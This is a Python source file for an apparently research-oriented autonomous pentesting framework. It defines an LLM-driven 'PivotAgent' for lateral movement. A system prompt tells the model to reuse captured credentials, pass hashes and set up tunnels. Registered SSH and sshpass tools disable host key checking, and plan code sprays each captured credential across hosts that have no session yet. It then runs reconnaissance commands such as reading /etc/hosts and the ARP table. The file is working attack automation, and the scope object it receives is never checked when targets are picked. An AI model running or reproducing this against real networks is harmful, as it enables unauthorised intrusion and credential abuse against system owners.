"""PivotAgent — lateral movement between hosts using captured credentials/sessions.

Reference: Cochise executor.py — SSH command execution + credential reuse
           AD_pt paper — Pass-the-Hash, Pass-the-Ticket techniques
"""

from __future__ import annotations

import json
from typing import Any, Dict, List

from darwin.dkg import DKG
from darwin.sub_agents.base import (
    AgentType, BaseSubAgent, SubAgentResult, TaskScope, TokenBudget,
)
from darwin.tools.mcp_gateway import MCPGateway
from darwin.utils.llm import LLMSession


SYSTEM_PROMPT_PIVOT = """You are a lateral movement specialist. Your goal is to use
captured credentials and sessions to move between hosts.

## Capabilities
- Credential reuse: Try known passwords on other services/hosts
- SSH key reuse: Try captured SSH keys on other hosts
- Pass-the-Hash: Use NTLM hashes for Windows lateral movement
- Tunnel setup: Establish proxy tunnels to reach internal networks

## Available Commands
You have access to shell execution for tools like:
ssh, impacket-psexec, impacket-wmiexec, chisel, socat, proxychains

## Workflow
1. Check DKG for available credentials and sessions
2. Check DKG for unreached internal hosts
3. Attempt credential reuse / lateral movement
4. Report new sessions and reachable hosts to DKG

## Output
Report any new sessions established or hosts reached."""


class PivotAgent(BaseSubAgent):
    """Lateral movement agent.

    Uses captured credentials to move between hosts, expanding the attack surface.

    Reference: Cochise executor.py — credential-based movement patterns
    """

    def __init__(
        self,
        agent_id: str,
        task_scope: TaskScope,
        dkg: DKG,
        llm_session: LLMSession | None = None,
        budget: TokenBudget | None = None,
    ):
        tools = MCPGateway()
        # Register pivot-specific shell tools
        tools.register_shell_tool(
            name="ssh_exec",
            command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{host} '{command}'",
            description="Execute command on remote host via SSH using captured credentials",
            parameters={
                "user": {"type": "string", "description": "Username for SSH login"},
                "host": {"type": "string", "description": "Target host IP or hostname"},
                "command": {"type": "string", "description": "Command to execute on remote host"},
            },
        )
        tools.register_shell_tool(
            name="ssh_key_exec",
            command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i {key_path} {user}@{host} '{command}'",
            description="Execute command on remote host using SSH key authentication",
            parameters={
                "key_path": {"type": "string", "description": "Path to SSH private key"},
                "user": {"type": "string", "description": "Username for SSH login"},
                "host": {"type": "string", "description": "Target host IP or hostname"},
                "command": {"type": "string", "description": "Command to execute on remote host"},
            },
        )
        tools.register_shell_tool(
            name="test_credential",
            command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{host} 'id' 2>&1",
            description="Test if a username/password combination works on a remote host",
            parameters={
                "user": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password to test"},
                "host": {"type": "string", "description": "Target host IP or hostname"},
            },
        )

        super().__init__(
            agent_id=agent_id,
            agent_type=AgentType.PIVOT,
            task_scope=task_scope,
            dkg=dkg,
            llm_session=llm_session or LLMSession(),
            budget=budget or TokenBudget(max_tokens=32000, max_iterations=20),
            tools=tools,
        )

    async def _generate_plan(self) -> List[Dict[str, Any]]:
        """Generate lateral movement plan from DKG state."""
        credentials = self.dkg.query_nodes("Credential")
        sessions = self.dkg.query_nodes("Session")
        hosts = self.dkg.query_nodes("Host")

        plan = []

        # For each credential, try on each non-sessioned host
        for i, cred in enumerate(credentials):
            cred_user = cred.get("user", "")
            cred_pass = cred.get("password", "")
            cred_hash = cred.get("hash", "")
            cred_key = cred.get("ssh_key_path", "")
            source_host = cred.get("source_host", "")

            # Find hosts we haven't established a session on yet
            sessioned_hosts = {s.get("host", "") for s in sessions}
            target_hosts = [
                h["id"] for h in hosts
                if h["id"] not in sessioned_hosts and h["id"] != source_host
            ]

            for target in target_hosts[:3]:  # limit scope
                plan.append({
                    "id": f"pivot-{i}-{target}",
                    "instruction": f"Test credential {cred_user} on {target}",
                    "action": "credential_test",
                    "tool": "test_credential" if cred_pass else "ssh_exec",
                    "params": {
                        "user": cred_user,
                        "host": target,
                        "password": cred_pass,
                        "command": "id; hostname; ifconfig 2>/dev/null || ip addr 2>/dev/null",
                    },
                    "credential_id": cred.get("id", ""),
                    "dependent_task_ids": [],
                })

        # Also add tasks to probe internal hosts from existing sessions
        for session in sessions:
            session_host = session.get("host", "")
            if session.get("access_level") in ("root", "admin", "system"):
                plan.append({
                    "id": f"pivot-probe-{session_host}",
                    "instruction": f"Probe for internal hosts reachable from {session_host}",
                    "action": "internal_probe",
                    "tool": "ssh_exec",
                    "params": {
                        "user": session.get("user", "root"),
                        "host": session_host,
                        "command": "ip route; arp -a 2>/dev/null; cat /etc/hosts 2>/dev/null",
                    },
                    "dependent_task_ids": [],
                })

        return plan

    async def _execute_task(self, task: Dict[str, Any]) -> Any:
        """Execute a lateral movement task."""
        tool_name = task.get("tool", "test_credential")
        params = task.get("params", {})
        result = await self.tools.call(tool_name, params)
        self.budget.tokens_used += 800
        return result

    async def _evaluate_result(
        self, task: Dict[str, Any], result: Any
    ) -> tuple[bool, List[Dict[str, Any]]]:
        """Evaluate pivot result — check for successful session establishment."""
        findings = []

        if not hasattr(result, "success"):
            return False, findings

        stdout = getattr(result, "stdout", "")
        success = result.success

        if success:
            params = task.get("params", {})
            host = params.get("host", "")
            user = params.get("user", "")

            # Check if we got a shell
            shell_indicators = ["uid=", "gid=", "Linux", "Windows", "$ ", "# "]
            got_shell = any(ind in stdout for ind in shell_indicators)

            if got_shell:
                findings.append({
                    "type": "new_session",
                    "host": host,
                    "user": user,
                    "access_level": "user",
                    "evidence": stdout[:200],
                    "source": "pivot",
                })

                # Mark host as reachable
                self.dkg.update_node(host, {"is_reachable": True})

                # Record new session in DKG
                self.dkg.add_node("Session", f"session-{host}-{user}", {
                    "host": host,
                    "user": user,
                    "access_level": "shell",
                    "shell_type": "ssh",
                    "established_by": self.agent_id,
                })

            # Check for internal network discovery
            if "inet " in stdout or "addr:" in stdout:
                import re
                ips = re.findall(r"(?:inet\s+|addr:)(\d+\.\d+\.\d+\.\d+)", stdout)
                for ip in ips:
                    if ip not in ("127.0.0.1", "0.0.0.0"):
                        findings.append({
                            "type": "new_internal_host",
                            "host": ip,
                            "evidence": f"Discovered via session on {host}",
                            "source": "pivot",
                        })
                        # Add to DKG
                        self.dkg.add_node("Host", ip, {
                            "ip": ip,
                            "is_reachable": False,  # indirectly reachable
                            "is_internal": True,
                            "discovered_by": self.agent_id,
                            "reachable_via": host,
                        })

        self.findings.extend(findings)
        return len(findings) > 0, findings

    def _write_findings_to_dkg(
        self, task: Dict[str, Any], result: Any, findings: List[Dict[str, Any]]
    ) -> None:
        """Pivot findings are written directly during _evaluate_result."""
        pass  # Already written in _evaluate_result for real-time DKG updates
